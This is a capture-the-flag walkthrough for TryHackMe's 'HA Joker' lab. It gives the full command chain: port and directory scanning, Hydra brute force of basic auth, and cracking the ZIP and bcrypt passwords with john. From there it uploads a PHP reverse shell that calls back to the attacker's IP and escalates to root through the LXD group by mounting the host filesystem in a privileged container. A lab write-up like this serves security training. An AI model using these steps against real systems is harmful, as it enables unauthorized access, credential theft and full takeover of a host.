# TryHackMe-HA Joker CTF

**Scope:**

- Joomla
- LXC (Linux Containers)

**Keywords:**

- Directory Scan & Endpoint Control
- Login Brute Force
- ZIP File Password Cracking
- User Password Cracking
- Reverse Shell Phase
- Privilege Escalation with LXC (Linux Containers)

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -F $target_ip`
- `wfuzz -u http://joker.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -c -L -t 50`
- `gobuster dir -u http://joker.thm -w /usr/share/wordlists/dirb/common.txt -b 403,404,500,501,502,503 -e -x php,txt,html -t 50`
- `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f joker.thm -t 50 -s 8080 -F http-get`
- `echo 'am9rZXI6aGFubmFo' | base64 -d`
- `gobuster dir -u http://joker.thm:8080 -w /usr/share/wordlists/dirb/common.txt --random-agent -b 403,404,500,501,502,503 -r -t 50 -x php,txt,zip,html -H 'Authorization: Basic am9rZXI6aGFubmFo'`
- `wget --header="Authorization: Basic am9rZXI6aGFubmFo" http://joker.thm:8080/backup.zip -O backup.zip`
- `zip2john backup.zip > ziphash`
- `sudo john ziphash --wordlist=/usr/share/wordlists/rockyou.txt`
- `grep cc1gr_users db/joomladb.sql`
- `sudo john --wordlist=/usr/share/wordlists/rockyou.txt adminpasshash --format=bcrypt`
- `searchsploit 'Joomla! 3.7.0'`

**System Commands:**

- `getent group lxd`
- `export TERM=xterm`
- `SHELL=/bin/bash script -q /dev/null`
- `netstat -tulwn`
- `find / -type f -perm -u=s 2>/dev/null`
- `lxc version`
- `lxc image list`
- `find / -writable 2>/dev/null`
- `lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myalpine`
- `lxc init myalpine joker -c security.privileged=true`
- `lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true`
- `lxc start joke`
- `lxc exec joker /bin/sh`

### Laboratory Environment

[HA Joker CTF](https://tryhackme.com/r/room/jokerctf)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -F $target_ip`

```jsx
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://joker.thm`

```jsx
HTTP/1.1 200 OK
Date: Tue, 24 Dec 2024 10:31:02 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Wed, 09 Oct 2019 04:54:22 GMT
ETag: "1742-5947314152e73"
Accept-Ranges: bytes
Content-Length: 5954
Vary: Accept-Encoding
Content-Type: text/html

[REDACTED] - MORE
```

![image.png](image.png)

`curl -iLX GET -D response.txt http://joker.thm:8080`

```jsx
HTTP/1.1 401 Unauthorized
Date: Tue, 24 Dec 2024 10:32:51 GMT
Server: Apache/2.4.29 (Ubuntu)
WWW-Authenticate: Basic realm=" Please enter the password."
Content-Length: 458
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at joker.thm Port 8080</address>
</body></html>
```

![image.png](image%201.png)

> **Directory Scan & Endpoint Control Phase**
> 

`wfuzz -u http://joker.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -c -L -t 50`

```jsx
000001114:   200        17 L     69 W       1116 Ch     "css"                                                                     
000001998:   200        34 L     221 W      4364 Ch     "img"                                                                     
000002020:   200        96 L     826 W      5954 Ch     "index.html"                                                              
000002946:   200        1162 L   5848 W     94994 Ch    "phpinfo.php"
```

`gobuster dir -u http://joker.thm -w /usr/share/wordlists/dirb/common.txt -b 403,404,500,501,502,503 -e -x php,txt,html -t 50`

```jsx
http://joker.thm/css                  (Status: 301) [Size: 304] [--> http://joker.thm/css/]
http://joker.thm/img                  (Status: 301) [Size: 304] [--> http://joker.thm/img/]
http://joker.thm/index.html           (Status: 200) [Size: 5954]
http://joker.thm/index.html           (Status: 200) [Size: 5954]
http://joker.thm/phpinfo.php          (Status: 200) [Size: 94733]
http://joker.thm/phpinfo.php          (Status: 200) [Size: 94733]
http://joker.thm/secret.txt           (Status: 200) [Size: 320]
```

`curl -iLX GET http://joker.thm/secret.txt`

```jsx
HTTP/1.1 200 OK
Date: Tue, 24 Dec 2024 10:47:48 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Wed, 09 Oct 2019 04:33:21 GMT
ETag: "140-59472c8e9c1ed"
Accept-Ranges: bytes
Content-Length: 320
Vary: Accept-Encoding
Content-Type: text/plain

Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

> **Login Brute Force & Internal System Investigation Phase**
> 

`nano users.txt`

```jsx
joker
batman
administrator
```

`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f joker.thm -t 50 -s 8080 -F http-get`

```jsx
[8080][http-get] host: joker.thm   login: joker   password: hannah
```

![image.png](image%202.png)

![image.png](image%203.png)

![image.png](image%204.png)

`echo 'am9rZXI6aGFubmFo' | base64 -d`

```jsx
joker:hannah
```

`gobuster dir -u http://joker.thm:8080 -w /usr/share/wordlists/dirb/common.txt --random-agent -b 403,404,500,501,502,503 -r -t 50 -x php,txt,zip,html -H 'Authorization: Basic am9rZXI6aGFubmFo'`

```jsx
/administrator        (Status: 200) [Size: 4748]
/bin                  (Status: 200) [Size: 31]
/cache                (Status: 200) [Size: 31]
/components           (Status: 200) [Size: 31]
/configuration.php    (Status: 200) [Size: 0]
/images               (Status: 200) [Size: 31]
/index.php            (Status: 200) [Size: 10937]
/index.php            (Status: 200) [Size: 10937]
/includes             (Status: 200) [Size: 31]
/language             (Status: 200) [Size: 31]
/layouts              (Status: 200) [Size: 31]
/LICENSE.txt          (Status: 200) [Size: 18092]
/LICENSE              (Status: 200) [Size: 18092]
/libraries            (Status: 200) [Size: 31]
/media                (Status: 200) [Size: 31]
/modules              (Status: 200) [Size: 31]
/plugins              (Status: 200) [Size: 31]
/README               (Status: 200) [Size: 4494]
/README.txt           (Status: 200) [Size: 4494]
/robots               (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/templates            (Status: 200) [Size: 31]
/tmp                  (Status: 200) [Size: 31]
/web.config           (Status: 200) [Size: 1690]
/web.config.txt       (Status: 200) [Size: 1690]
```

`curl -iLX GET -H 'Authorization: Basic am9rZXI6aGFubmFo' http://joker.thm:8080/administrator`

```jsx
HTTP/1.1 301 Moved Permanently
Date: Tue, 24 Dec 2024 11:05:17 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://joker.thm:8080/administrator/
Content-Length: 321
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Tue, 24 Dec 2024 11:05:17 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: 0d073d2ec68ac2f24f859831bbe8843b=tqf9nc12jm5hbi9pf9ch0sap15; path=/; HttpOnly
X-Frame-Options: SAMEORIGIN
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Tue, 24 Dec 2024 11:05:17 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 4748
Content-Type: text/html; charset=utf-8

[REDACTED] - MORE

 <input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="Username" size="15" autofocus="true" />
<a href="http://joker.thm:8080/index.php?option=com_users&view=remind" class="btn width-auto hasTooltip" title="Forgot your username?">
<span class="icon-help"></span>

[REDACTED] - MORE
```

`curl -iLX GET -H 'Authorization: Basic am9rZXI6aGFubmFo' http://joker.thm:8080/configuration.php`

```jsx
HTTP/1.1 200 OK
Date: Tue, 24 Dec 2024 11:07:04 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```

`curl -iLX GET -H 'Authorization: Basic am9rZXI6aGFubmFo' http://joker.thm:8080/web.config.txt`

```jsx
HTTP/1.1 200 OK
Date: Tue, 24 Dec 2024 11:07:44 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 25 Apr 2017 14:53:27 GMT
ETag: "69a-54dfee2e147c0"
Accept-Ranges: bytes
Content-Length: 1690
Vary: Accept-Encoding
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <location path=".">
   <system.webServer>
       <directoryBrowse enabled="false" />
       <rewrite>
           <rules>
               <rule name="Joomla! Rule 1" stopProcessing="true">
                   <match url="^(.*)$" ignoreCase="false" />
                   <conditions logicalGrouping="MatchAny">
                       <add input="{QUERY_STRING}" pattern="base64_encode[^(]*\([^)]*\)" ignoreCase="false" />
                       <add input="{QUERY_STRING}" pattern="(&gt;|%3C)([^s]*s)+cript.*(&lt;|%3E)" />
                       <add input="{QUERY_STRING}" pattern="GLOBALS(=|\[|\%[0-9A-Z]{0,2})" ignoreCase="false" />
                       <add input="{QUERY_STRING}" pattern="_REQUEST(=|\[|\%[0-9A-Z]{0,2})" ignoreCase="false" />
                   </conditions>
                   <action type="CustomResponse" url="index.php" statusCode="403" statusReason="Forbidden" statusDescription="Forbidden" />
               </rule>
               <rule name="Joomla! Rule 2">
                   <match url="(.*)" ignoreCase="false" />
                   <conditions logicalGrouping="MatchAll">
                     <add input="{URL}" pattern="^/index.php" ignoreCase="true" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
                   </conditions>
                   <action type="Rewrite" url="index.php" />
               </rule>
           </rules>
       </rewrite>
   </system.webServer>
   </location>
</configuration>

```

`curl -iLX GET -H 'Authorization: Basic am9rZXI6aGFubmFo' http://joker.thm:8080/robots.txt`

```jsx
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

`gobuster dir -u http://joker.thm:8080 -w /usr/share/wordlists/dirb/big.txt --random-agent -b 403,404,500,501,502,503 -r -t 70 -x php,txt,zip,html -H 'Authorization: Basic am9rZXI6aGFubmFo'`

```jsx

[REDACTED] - SAME

backup.zip
```

`wget --header="Authorization: Basic am9rZXI6aGFubmFo" http://joker.thm:8080/backup.zip -O backup.zip`

```jsx
backup.zip                         100%[===============================================================>]  11.57M   496KB/s    in 34s     

2024-12-24 06:20:37 (344 KB/s) - ‘backup.zip’ saved [12133560/12133560]
```

> **ZIP File Password Cracking & Credentials Phase**
> 

`zip2john backup.zip > ziphash`

`sudo john ziphash --wordlist=/usr/share/wordlists/rockyou.txt`

```jsx
hannah           (backup.zip)
```

`unzip backup.zip`

```jsx
Archive:  backup.zip
   creating: db/
[backup.zip] db/joomladb.sql password: hannah
  inflating: db/joomladb.sql
  
[REDACTED] - MORE
```

`ls -lsa db`

```jsx
total 260
  4 drwxr-xr-x 2 root root   4096 Oct 25  2019 .
  4 drwxr-xr-x 4 root root   4096 Dec 24 06:24 ..
252 -rw-r--r-- 1 root root 257091 Oct 25  2019 joomladb.sql
```

`grep CREATE TABLE db/joomladb.sql | grep user`

```jsx
db/joomladb.sql:CREATE TABLE `cc1gr_user_keys` (
db/joomladb.sql:CREATE TABLE `cc1gr_user_notes` (
db/joomladb.sql:CREATE TABLE `cc1gr_user_profiles` (
db/joomladb.sql:CREATE TABLE `cc1gr_user_usergroup_map` (
db/joomladb.sql:CREATE TABLE `cc1gr_usergroups` (
db/joomladb.sql:CREATE TABLE `cc1gr_users` (
```

`grep cc1gr_users db/joomladb.sql`

```jsx
-- Table structure for table `cc1gr_users`
DROP TABLE IF EXISTS `cc1gr_users`;
CREATE TABLE `cc1gr_users` (
-- Dumping data for table `cc1gr_users`
LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User',
'admin','admin@example.com',
'$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',
0,1,
'2019-10-08 12:00:15',
'2019-10-25 15:20:02',
'0',
'{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;

```

> **User Password Cracking Phase**
> 

`nano adminpasshash`

```jsx
$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
```

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt adminpasshash --format=bcrypt`

```jsx
abcd1234         (?)  
```

> **Admin Account Access & Exploitation Search Phase**
> 

![image.png](image%205.png)

`searchsploit 'Joomla! 3.7.0'`

```jsx
--------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                               | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                            | php/webapps/43488.txt
--------------------------------------------------------------------------------------------------------- --------------------------------
```

![image.png](image%206.png)

![image.png](image%207.png)

![image.png](image%208.png)

> **Reverse Shell Phase**
> 

`wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O reverse.php`

```jsx
reverse.php                        100%[===============================================================>]   5.36K  --.-KB/s    in 0.002s  

2024-12-24 06:41:05 (3.21 MB/s) - ‘reverse.php’ saved [5491/5491]
```

`nano reverse.php`

```jsx
[REDACTED] - MORE

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.2.37.37';  // CHANGE THIS
$port = 10001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

[REDACTED] - MORE
```

`nc -nlvp 10001`

```jsx
listening on [any] 10001 ...
```

![image.png](image%209.png)

`curl -iLX GET http://joker.thm:8080/templates/beez3/error.php`

```jsx
listening on [any] 10001 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.58.1] 38480
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:51:56 up  1:24,  0 users,  load average: 0.04, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
$ ğwd
/bin/sh: 3: ğwd: not found
$ groups
www-data lxd
$ export TERM=xterm
$ SHELL=/bin/bash script -q /dev/null

www-data@ubuntu:/$ getent group lxd
lxd:x:115:joker,www-data

www-data@ubuntu:/$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
joker:x:1000:1000:joker,,,:/home/joker:/bin/bash

www-data@ubuntu:/$ ls -lsa /home
total 12
4 drwxr-xr-x  3 root  root  4096 Oct  8  2019 .
4 drwxr-xr-x 22 root  root  4096 Oct 21  2019 ..
4 drwxr-xr-x  5 joker joker 4096 Oct 25  2019 joker

www-data@ubuntu:/$ ls -lsa /home/joker
total 40
4 drwxr-xr-x 5 joker joker 4096 Oct 25  2019 .
4 drwxr-xr-x 3 root  root  4096 Oct  8  2019 ..
4 -rw------- 1 joker joker   31 Oct 25  2019 .bash_history
4 -rw-r--r-- 1 joker joker  220 Oct  8  2019 .bash_logout
4 -rw-r--r-- 1 joker joker 3771 Oct  8  2019 .bashrc
4 drwx------ 2 joker joker 4096 Oct  8  2019 .cache
4 drwxr-x--- 3 joker joker 4096 Oct 25  2019 .config
4 drwxrwxr-x 3 joker joker 4096 Oct  8  2019 .local
4 -rw------- 1 root  root    91 Oct  8  2019 .mysql_history
4 -rw-r--r-- 1 joker joker  807 Oct  8  2019 .profile
0 -rw-r--r-- 1 joker joker    0 Oct  8  2019 .sudo_as_admin_successful

www-data@ubuntu:/$ uname -a
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

www-data@ubuntu:/$ dpkg --version
Debian 'dpkg' package management program version 1.19.0.5 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.

www-data@ubuntu:/$ 

```

> **Privilege Escalation with LXC (Linux Containers)**
> 

**For more information:**

[lxd/lxc Group - Privilege escalation | HackTricks](https://book.hacktricks.xyz/sr/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

[https://github.com/saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)

[Linux Containers - LXD - Has been moved to Canonical](https://linuxcontainers.org/lxd/)

```jsx
www-data@ubuntu:/$ netstat -tulwn
netstat -tulwn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp6       0      0 :::8080                 :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 10.10.58.1:68           0.0.0.0:*                          
raw6       0      0 :::58                   :::*                    7          

www-data@ubuntu:/$ find / -type f -perm -u=s 2>/dev/null 

/bin/ping
/bin/mount
/bin/umount
/bin/su
/bin/fusermount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/newgrp

www-data@ubuntu:/$ lxc version
Client version: 3.0.3
Server version: 3.0.3

www-data@ubuntu:/$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+

www-data@ubuntu:/$ find / -writable 2>/dev/null

[REDACTED] - MORE

/opt/joomla/templates/
/opt/joomla/libraries/vendor/joomla/event
/opt/joomla/libraries/vendor/joomla/event/LICENSE
/opt/joomla/libraries/vendor/joomla/event/src

[REDACTED] - MORE

www-data@ubuntu:/$ 
```

`git clone https://github.com/saghul/lxd-alpine-builder.git`

`cd lxd-alpine-builder`

`./build-alpine`

`ls -lsa`

```jsx
   4 drwxr-xr-x  8 root root    4096 Dec 24 12:00 .git
  28 -rw-r--r--  1 root root   26530 Dec 24 12:00 LICENSE
   4 -rw-r--r--  1 root root     768 Dec 24 12:00 README.md
3184 -rw-r--r--  1 root root 3259593 Dec 24 12:00 alpine-v3.13-x86_64-20210218_0139.tar.gz                                                                                        
   8 -rwxr-xr-x  1 root root    8060 Dec 24 12:00 build-alpine
   4 drwxr-xr-x  5 root root    4096 Dec 24 12:01 rootfs
```

`python3 -m http.server 8000`

```jsx
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```jsx
www-data@ubuntu:/$ cd /opt/joomla/templates/protostar

www-data@ubuntu:/opt/joomla/templates/protostar$ wget http://10.10.73.136:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

alpine-v3.13-x86_64 100%[===================>]   3.11M  --.-KB/s    in 0.01s   

2024-12-24 04:05:09 (301 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]

www-data@ubuntu:/opt/joomla/templates/protostar$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myalpine
www-data@ubuntu:/opt/joomla/templates/protostar$ lxc image list
+----------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+----------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myalpine | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Dec 24, 2024 at 12:06pm (UTC) |
+----------+--------------+--------+-------------------------------+--------+--------+-------------------------------+

www-data@ubuntu:/opt/joomla/templates/protostar$ lxc init myalpine joker -c security.privileged=true
Creating joker

www-data@ubuntu:/opt/joomla/templates/protostar$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to joker

www-data@ubuntu:/opt/joomla/templates/protostar$ lxc start joker
www-data@ubuntu:/opt/joomla/templates/protostar$ lxc exec joker /bin/sh

~ # whoami
whoami
root
~ # id
id
uid=0(root) gid=0(root)
~ # 
```

# Appendix

## LXC (Linux Containers)

<aside>
💡

LXC (Linux Containers) is a lightweight virtualization technology that provides an environment similar to a virtual machine but without the overhead of a separate kernel or full hardware virtualization. LXC allows you to run multiple isolated Linux systems (containers) on a single host using the same kernel.

</aside>